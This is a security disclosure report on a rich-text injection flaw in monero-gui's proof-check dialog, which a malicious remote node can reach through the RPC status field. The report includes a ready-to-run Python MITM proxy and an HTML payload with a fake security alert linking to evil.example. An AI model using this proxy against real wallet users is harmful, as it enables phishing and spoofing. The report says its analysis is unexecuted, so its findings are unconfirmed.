# Malicious/compromised remote node can inject unescaped rich-text (HTML) into the GUI's "Prove/Check" result dialog via the `gettransactions` RPC `status` field

## Asset

This finding is against **`monero-gui`** (`monero-project/monero-gui`), a separate GitHub repository/HackerOne asset from `monero`/`monerod`. The exploitable sink (an unescaped `TextEdit.AutoText`-rendered dialog) lives entirely in `monero-gui`. The data-flow that makes the sink attacker-reachable passes through the vendored core wallet library (`monero`, i.e. `wallet2`/`wallet_api`), which is referenced here only to trace the full chain end to end, exactly as `monero-gui` links against and ships it. The fix belongs in `monero-gui` (sanitize/escape before display, or stop treating this text as rich text) regardless of what upstream does.

## Summary

`monero-gui`'s "Prove/Check" page (`pages/TxKey.qml`) lets a user check a **spend proof** for any transaction id by leaving the address field blank and pasting a signature that merely *looks* like a `SpendProofV1...` string (client-side validation only checks length/charset, not cryptographic validity). This calls into the wallet library's `check_spend_proof()`, which — before it ever gets to verify any signature — first fetches the transaction from the currently-connected daemon via a `/gettransactions` RPC call.

If that daemon (which can be any user-added "remote node", trusted or not — this code path applies **no daemon-trust gating at all**) returns a non-`"OK"` value in the RPC response's `status` field, the wallet library throws an exception whose message embeds that `status` string **completely verbatim, with no length limit and no character filtering**. `monero-gui` catches this exception generically, stores its message as the wallet's `errorString`, and — when the "Check" result doesn't parse as a recognized success format — assigns that raw string directly to `informationPopup.text` in `main.qml`, with **no escaping**.

`informationPopup` is an instance of `components/StandardDialog.qml`, whose text area is rendered with `textFormat: TextEdit.AutoText`. Qt's `AutoText` format auto-detects HTML-like content and renders it as rich text. A malicious/rogue daemon can therefore fully control the formatted (bold/colored/linked/styled) content of a dialog box the wallet displays to the user in response to a routine "check this payment proof" action — the exact same root-cause bug class (unescaped externally-influenced text rendered as `RichText`/`AutoText`) as the already-fixed HackerOne report #3679471 (PR monero-project/monero-gui#4577 and its two follow-up hardening commits `23ec5eb6` and `3d3a391e`), but via a fresh, previously-unaddressed vector: a daemon-controlled RPC `status` string, not a `tx_description`/address-book field.

## Severity

Monero severity: **MEDIUM** (GUI content-spoofing / rich-text injection in a security-adjacent dialog; requires the victim's wallet to be pointed at, or MITM'd by, a malicious/dishonest daemon — a common and explicitly-supported configuration in monero-gui, e.g. any user-added "remote node" that does *not* need to be marked "Trusted").

Suggested CVSS v3.1: `5.3` with `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`
(Network-reachable by controlling/MITMing the configured daemon `AV:N/AC:L`; no daemon authentication required beyond being the node the wallet talks to `PR:N`; requires the victim to use the "Check proof" feature `UI:R`; impact is limited to spoofed/misleading dialog content — no code execution, no fund loss confirmed by static analysis alone `C:N/I:L/A:N`.)

## Affected Versions

Confirmed present on:
- **`monero-gui` `master`**, commit `7691273c6303de9b128c447fb29c437a814e62e6`
- Data-flow root cause confirmed present in the vendored core wallet library, **`monero` `master`**, commit `9e3a31032ee2cf3cb65c908e107a9952d03bbc4f` (cited only for cross-reference/completeness; the fix belongs in `monero-gui`)

The two prior hardening commits that fixed the sibling RichText-injection bug class in `monero-gui` (`23ec5eb6a1dc61ef72a3ca4c9bb5942cbf60d959` "qml: escape untrusted text in RichText views" and `3d3a391ef43b1ac09160f4d572d5fbf85f249dc8` "qml: escape untrusted text in remaining RichText views") do **not** touch `components/StandardDialog.qml`, `main.qml`'s `txProofComputed()`/`handleCheckProof()`, or any wallet-library `errorString`/exception-message path — confirmed by `git log -p -- components/StandardDialog.qml` and `git log --oneline -- main.qml | xargs -n1 -I{} git show --stat {}` around those commits, and by direct inspection of both hardening commits' diffs (`TxConfirmationDialog.qml`, `js/Utils.js`, `pages/settings/SettingsLog.qml`, `pages/History.qml`, `pages/merchant/Merchant.qml`, `pages/settings/SettingsInfo.qml` only).

## Root Cause

### 1. The GUI sink: `informationPopup` renders arbitrary text as `AutoText`

`components/StandardDialog.qml` (the generic modal dialog component used app-wide):

```qml
    property alias text: dialogContent.text        // line 44
    property alias content: root.text               // line 45
...
                TextArea.flickable: TextArea {
                    id: dialogContent
                    Layout.fillWidth: true
                    Layout.fillHeight: true
                    renderType: Text.QtRendering
                    font.family: MoneroComponents.Style.fontLight.name
                    textFormat: TextEdit.AutoText     // line 142
                    readOnly: true
```

`main.qml` instantiates this component as a single, global, app-wide dialog:

```qml
    // Information dialog
    StandardDialog {
        // dynamically change onclose handler
        property var onCloseCallback
        id: informationPopup                          // line 1647
```

`Qt::TextEdit.AutoText` auto-detects HTML-like content (Qt's `Qt::mightBeRichText()` heuristic: it looks for a `<...>`-shaped tag anywhere in the string) and, when detected, parses and renders the **entire** string as rich text via `QTextDocument`'s HTML subset — supporting styled/colored/bold text, line breaks, tables, and `<a href>` links — with no HTML-escaping performed anywhere on this path.

### 2. The GUI call sites that feed it unescaped, attacker-influenced text

`main.qml`:

```js
    function txProofComputed(txid, result){
        if (result.indexOf("error|") === 0) {
            var errorString = result.split("|")[1];
            informationPopup.text = qsTr("Couldn't generate a proof because of the following reason: \n") + errorString + translationManager.emptyString;   // line 1100
            informationPopup.icon = StandardIcon.Critical;
        } else {
            informationPopup.text  = result;
            informationPopup.icon = StandardIcon.Critical;
        }
    }
```

```js
    function handleCheckProof(txid, address, message, signature) {
        ...
        else {
            informationPopup.title  = qsTr("Error") + translationManager.emptyString;
            informationPopup.text = currentWallet.errorString;    // line 1165 — reached whenever result[0] !== "true"
            informationPopup.icon = StandardIcon.Critical
        }
        informationPopup.onCloseCallback = null
        informationPopup.open()
    }
```

`errorString`/`currentWallet.errorString` is `Wallet::errorString()` (`src/libwalletqt/Wallet.cpp:207`), which returns `m_walletImpl->errorString()` — the raw wallet-library status message — verbatim, with no processing.

### 3. How the daemon controls that string: `check_spend_proof`/`get_spend_proof` embed the raw RPC `status` field with no sanitization and no trust gating

In the vendored core wallet library (`monero`, `src/wallet/wallet2.cpp`):

```cpp
// wallet2::check_spend_proof, line ~12040-12051
  COMMAND_RPC_GET_TRANSACTIONS::request req = AUTO_VAL_INIT(req);
  req.txs_hashes.push_back(epee::string_tools::pod_to_hex(txid));
  req.decode_as_json = false;
  req.prune = true;
  COMMAND_RPC_GET_TRANSACTIONS::response res = AUTO_VAL_INIT(res);
  bool r;
  {
    const boost::lock_guard<boost::recursive_mutex> lock{m_daemon_rpc_mutex};
    r = epee::net_utils::invoke_http_json("/gettransactions", req, res, *m_http_client, rpc_timeout);
    THROW_ON_RPC_RESPONSE_ERROR_GENERIC(r, {}, res, "gettransactions");   // line 12051
```

(the sibling function `wallet2::get_spend_proof`, used by the "Generate proof" flow, has the identical pattern at line 11934: `THROW_ON_RPC_RESPONSE_ERROR_GENERIC(r, {}, res, "gettransactions");`.)

`THROW_ON_RPC_RESPONSE_ERROR_GENERIC` (`src/wallet/wallet_errors.h:1052-1053`):

```cpp
#define THROW_ON_RPC_RESPONSE_ERROR_GENERIC(r, err, res, method) \
    THROW_ON_RPC_RESPONSE_ERROR(r, err, res, method, tools::error::wallet_generic_rpc_error, method, res.status)
```

`res.status` here is the raw, attacker-controlled `"status"` JSON field the daemon sent back in its `/gettransactions` response — **completely unfiltered**. This is a materially different (and unprotected) code path from the one used elsewhere in the same file for sending transactions, where the project already applies a trust-aware sanitizer:

```cpp
// src/rpc/core_rpc_server_commands_defs.h:83-92
inline const std::string get_rpc_status(const bool trusted_daemon, const std::string &s)
{
  if (trusted_daemon)
    return s;
  if (s == CORE_RPC_STATUS_OK) return s;
  if (s == CORE_RPC_STATUS_BUSY) return s;
  if (s == CORE_RPC_STATUS_PAYMENT_REQUIRED) return s;
  return "<error>";
}
```

`THROW_ON_RPC_RESPONSE_ERROR_GENERIC`/`wallet_generic_rpc_error` never calls `get_rpc_status()` — it is used **unconditionally**, regardless of whether the connected daemon is marked "Trusted" in the GUI's remote-node settings (`components/RemoteNodeDialog.qml`'s "Mark as Trusted Daemon" checkbox has no bearing on this code path at all).

`wallet_generic_rpc_error`'s constructor (`src/wallet/wallet_errors.h:839-846`) builds the exception's `.what()` message directly from the raw status:

```cpp
    struct wallet_generic_rpc_error : public wallet_rpc_error
    {
      explicit wallet_generic_rpc_error(std::string&& loc, const std::string& request, const std::string& status)
        : wallet_rpc_error(std::move(loc), std::string("error in ") + request + " RPC: " + status, request),
        m_status(status)
      {
      }
```

### 4. The wallet API layer catches this generically and stores it as-is

`src/wallet/api/wallet.cpp`:

```cpp
bool WalletImpl::checkSpendProof(const std::string &txid_str, const std::string &message, const std::string &signature, bool &good) const {
    ...
    try
    {
        clearStatus();
        good = m_wallet->check_spend_proof(txid, message, signature);
        return true;
    }
    catch (const std::exception &e)
    {
        setStatusError(e.what());     // stores "error in gettransactions RPC: <attacker-controlled status>" verbatim
        return false;
    }
}
```

`setStatusError()`/`errorString()` (same file) perform no filtering whatsoever — they just store/return the string under a mutex.

### 5. `monero-gui` surfaces this verbatim

`src/libwalletqt/Wallet.cpp`:

```cpp
Q_INVOKABLE QString Wallet::checkSpendProof(const QString &txid, const QString &message, const QString &signature) const
{
    bool good;
    bool success = m_walletImpl->checkSpendProof(txid.toStdString(), message.toStdString(), signature.toStdString(), good);
    std::string result = std::string(success ? "true" : "false") + "|" + std::string(!success ? m_walletImpl->errorString() : good ? "true" : "false");
    return QString::fromStdString(result);
}
```

...and `errorString()` is also exposed directly as a `Q_PROPERTY` (`Wallet.h:76`), which is exactly what `main.qml:1165` reads (`currentWallet.errorString`) in the fallback branch of `handleCheckProof()`.

### 6. Reachability — how the user gets here

`pages/TxKey.qml` (the "Prove/Check" page):

```qml
            MoneroComponents.StandardButton {
                ...
                text: qsTr("Check") + translationManager.emptyString
                enabled: (TxUtils.checkTxID(checkProofTxIdLine.text) && TxUtils.checkSignature(checkProofSignatureLine.text) &&
                          ((checkProofSignatureLine.text.indexOf("SpendProofV") === 0 && checkProofAddressLine.text.length == 0) || ...))
                          || ...
                onClicked: {
                    middlePanel.checkProofClicked(checkProofTxIdLine.text, checkProofAddressLine.text, checkProofMessageLine.text, checkProofSignatureLine.text)
                }
            }
```

The "Check" button is enabled for a **spend-proof check** whenever: (a) the Tx ID field is any 64-hex-character string (`TxUtils.checkTxID` — `js/TxUtils.js:45-47`, only checks length/charset, not that the tx actually exists or belongs to the user), (b) the Address field is left **empty**, and (c) the Signature field merely satisfies the client-side format check in `TxUtils.checkSignature()` (`js/TxUtils.js:50-68`):

```js
    } else if (signature.indexOf("SpendProofV") === 0) {
        if ((signature.length - 12) % 88 != 0)
            return false;
        return check256(signature, signature.length);
    }
```

i.e. any string starting with `SpendProofV1` followed by a multiple of 88 alphanumeric characters passes this check — it is **not** a cryptographic validity check (that only happens deep inside `wallet2::check_spend_proof`, *after* the vulnerable `/gettransactions` call already fired). This means a user can trigger the vulnerable code path entirely on their own (no real proof or counterparty needed) simply by pasting any real-looking txid plus a format-valid garbage "signature" with the address field blank, while connected to an attacker-controlled or MITM'd daemon — or, more realistically, an attacker socially-engineers a victim into "verifying a payment proof" they were sent, on a node the attacker controls.

## Steps to Reproduce (unexecuted — for a human to run and confirm)

This has been derived and traced entirely by static source reading, per this engagement's rules; it has **not** been executed. The following is a concrete, believed-correct reproduction plan:

### 1. Stand up a malicious/proxying "daemon" that rewrites `/gettransactions` responses

```python
#!/usr/bin/env python3
# poc_malicious_gettransactions_status.py
#
# Sits between monero-gui and a real monerod, and rewrites the "status"
# field of /gettransactions JSON responses to an HTML-bearing string.
#
# Usage:
#   python3 poc_malicious_gettransactions_status.py <listen_port> <real_daemon_host> <real_daemon_port>
#   Then add http://127.0.0.1:<listen_port> as a "Remote Node" in monero-gui's
#   Settings -> Node page (leave "Mark as Trusted Daemon" UNCHECKED -- this bug
#   does not require the node to be trusted).

import http.server
import json
import sys
import urllib.request

REAL_HOST = None
REAL_PORT = None

INJECTED_STATUS = (
    "<h2 style='color:red'>WALLET SECURITY ALERT</h2>"
    "<p>Your proof check could not complete. "
    "<a href='https://evil.example/support'>Click here to contact support</a>.</p>"
)

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)

        real_url = f"http://{REAL_HOST}:{REAL_PORT}{self.path}"
        req = urllib.request.Request(real_url, data=body, method="POST",
                                      headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            real_body = resp.read()

        if self.path.rstrip('/').endswith("gettransactions"):
            try:
                doc = json.loads(real_body)
                doc["status"] = INJECTED_STATUS
                real_body = json.dumps(doc).encode()
                print("[proxy] rewrote /gettransactions status field")
            except Exception as e:
                print(f"[proxy] failed to rewrite response: {e}")

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(real_body)

    def log_message(self, fmt, *args):
        pass

if __name__ == "__main__":
    listen_port = int(sys.argv[1]) if len(sys.argv) > 1 else 38080
    REAL_HOST = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
    REAL_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 38081

    server = http.server.HTTPServer(("127.0.0.1", listen_port), Handler)
    print(f"[proxy] listening on 127.0.0.1:{listen_port}, forwarding to {REAL_HOST}:{REAL_PORT}")
    server.serve_forever()
```

Note: `/gettransactions` is a plain (non-JSON-RPC) REST-style endpoint whose top-level response object directly contains `"status"` (see `cryptonote::COMMAND_RPC_GET_TRANSACTIONS::response` in `monero`'s `src/rpc/core_rpc_server_commands_defs.h`), so the rewrite above (setting the top-level `status` key) matches the real wire format; a human running this should confirm the exact JSON shape against a live daemon response before relying on it.

### 2. Run a real daemon behind the proxy

```
./bin/monerod --regtest --fixed-difficulty 1 --offline \
  --data-dir /tmp/monero-poc-proof/chain \
  --rpc-bind-ip 127.0.0.1 --rpc-bind-port 38081 --confirm-external-bind \
  --non-interactive &

python3 poc_malicious_gettransactions_status.py 38080 127.0.0.1 38081
```

### 3. Point monero-gui at the malicious proxy as a remote node

In monero-gui: Settings → Node → enable "Use a remote node" → add `127.0.0.1:38080` → **do not** check "Mark as Trusted Daemon" (demonstrating this bug needs no elevated trust).

### 4. Trigger the vulnerable check

- Get any real 64-hex-character transaction id (e.g. from the regtest chain's coinbase/any mined tx, visible in the wallet's History page).
- Open the "Prove/Check" page (`TxKey.qml`).
- Tx ID: the txid above.
- Address: leave **blank**.
- Signature: `SpendProofV1` followed by 88 arbitrary alphanumeric characters (satisfies `(len-12) % 88 == 0`), e.g.:
  `SpendProofV1` + `A` * 88
- Click "Check".

### Expected result on the vulnerable build

`wallet2::check_spend_proof()` calls `/gettransactions` on the malicious proxy, receives the rewritten `status` field, throws `tools::error::wallet_generic_rpc_error`, which `WalletImpl::checkSpendProof()` catches and stores as `errorString`. `main.qml`'s `handleCheckProof()` falls into its final `else` branch and sets `informationPopup.text = currentWallet.errorString` verbatim, then opens the dialog. Because `informationPopup`'s `dialogContent` uses `textFormat: TextEdit.AutoText`, the injected `<h2>`/`<p>`/`<a href>` markup should render as styled rich text (red heading, clickable-looking link) inside the "Error" popup, instead of being displayed as literal text — confirming the injection. A human running this PoC should screenshot the resulting dialog and attach it, per this program's requirement for a working PoC with evidence.

## Possible Solution

In `monero-gui`, at minimum one of:

1. **Escape before display** — apply `Utils.htmlEscape()` (already added to `js/Utils.js` by commit `23ec5eb6` for exactly this bug class) to `errorString`/`currentWallet.errorString` wherever it is assigned into any `informationPopup`/`confirmationDialog` (or other `AutoText`/`RichText`) field: `main.qml:1100`, `main.qml:1165`, and audit the other ~30 call sites that assign `informationPopup.text`/`confirmationDialog.text` from a value that can trace back to `currentWallet.errorString`, `transaction.errorString`, or any other daemon/exception-derived message (e.g. `main.qml:1795` `qsTr("Error: ") + currentWallet.errorString`, `main.qml:832` daemon-start error message, `main.qml:1043` `qsTr("Couldn't send the money: ") + transaction.errorString`).
2. **Stop treating this dialog's content as rich text at all** — change `components/StandardDialog.qml:142`'s `textFormat: TextEdit.AutoText` to `TextEdit.PlainText` (or `Text.PlainText` for the `Text`-based one at line 212) for the generic informational/confirmation dialogs, since the vast majority of call sites pass plain `qsTr()` strings and do not need rich-text rendering; reserve `RichText` only for the handful of call sites (if any) that intentionally build markup, and escape their dynamic components explicitly as already done elsewhere.
3. Upstream in the core wallet library (`monero`), stop embedding the raw, unbounded daemon `status` string into exception `.what()` messages via `wallet_generic_rpc_error`/`THROW_ON_RPC_RESPONSE_ERROR_GENERIC` without at least the same `trusted_daemon`-aware sanitization (`get_rpc_status()`) already applied to the `sendrawtransaction` path — this would close the issue at the source for every caller of this macro (also used, with the identical unescaped pattern, in `wallet2::import_key_images()`'s `/is_key_image_spent` and `/gettransactions` calls at `wallet2.cpp:13446` and `wallet2.cpp:13532`), not just the two call sites analyzed in depth here. This is offered for completeness; since this report is scoped to `monero-gui`, the primary fix recommendation is (1)/(2) above.

## Impact

A malicious or compromised remote node — or a network man-in-the-middle on an unauthenticated daemon connection, which is monero-gui's default/common configuration for both local and "remote node" setups — can inject attacker-chosen rich-text/HTML content (styling, colors, headings, line breaks, and `<a href>`-style links) into the "Error"/"Prove-Check-result" dialog box that monero-gui displays to the user, by returning a crafted `status` field from a routine `/gettransactions` RPC response. This is reachable without the node being marked "Trusted," and without the user needing to do anything more unusual than using the built-in "Check proof" feature on any transaction id (including one an attacker supplies as part of a fake "proof of payment"). The confirmed impact (via static analysis) is UI content-spoofing / rich-text injection inside a dialog the user is likely to treat as authoritative wallet output — e.g., fabricated warning/status text, hidden or visually altered text via inline styling, or misleading formatted content — which could be leveraged for social engineering. This is the same root-cause bug class as the already-fixed HackerOne report #3679471 (unescaped externally-influenced text rendered via Qt `RichText`/`AutoText`), reoccurring at a sink the prior fix's two commits did not cover.

## Note on AI usage

This finding was identified and written up with AI assistance (static source-code reading and data-flow tracing only, no code execution, no build, no PoC execution), directly against the `monero-gui` `master` commit `7691273c6303de9b128c447fb29c437a814e62e6` and the `monero` `master` commit `9e3a31032ee2cf3cb65c908e107a9952d03bbc4f` provided for this engagement. Every source excerpt quoted above was read directly from the files at those commits (not reconstructed from memory or assumption), including: `components/StandardDialog.qml`, `main.qml`, `pages/TxKey.qml`, `js/TxUtils.js`, `src/libwalletqt/Wallet.cpp`, `src/libwalletqt/Wallet.h`, `src/wallet/wallet2.cpp`, `src/wallet/wallet_errors.h`, `src/wallet/api/wallet.cpp`, and `src/rpc/core_rpc_server_commands_defs.h`. The two prior hardening commits (`23ec5eb6`, `3d3a391e`) were located and diffed directly via `git log`/`git show` against the actual repository history to confirm this specific sink and data flow were not part of either fix. The end-to-end chain from the daemon RPC response field through five layers of code (core wallet2 exception → wallet-api catch/store → libwalletqt Qt wrapper → QML JS handler → QML rich-text sink) was traced by reading each link directly; it was **not** exercised at runtime. The PoC proxy script above was written to match the traced code paths and the `COMMAND_RPC_GET_TRANSACTIONS` response shape as read from source, but has **not** been run against a live `monerod`/`monero-gui` pair, and the exact rendering behavior of Qt's `TextEdit.AutoText`/`Qt::mightBeRichText()` heuristic on this specific payload has not been visually confirmed. A human should run the PoC, confirm the dialog actually renders the injected markup as rich text (screenshot it), and attach that evidence before submission, per this program's usual requirement for a working, evidenced PoC.
